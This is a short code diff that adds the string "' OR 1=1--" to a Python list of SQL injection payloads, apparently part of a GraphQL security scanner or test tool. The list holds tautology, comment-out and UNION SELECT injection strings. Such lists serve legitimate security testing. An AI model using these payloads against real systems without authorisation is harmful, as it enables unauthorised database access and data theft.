@@ -76,6 +76,7 @@ query IntrospectionQuery {
 PAYLOADS = [
     '" OR "1"="1',
     "' OR '1'='1",
+    "' OR 1=1--",
     "admin' -- ",
     "x' UNION SELECT NULL-- ",
     '"\' OR 1=1 -- ',
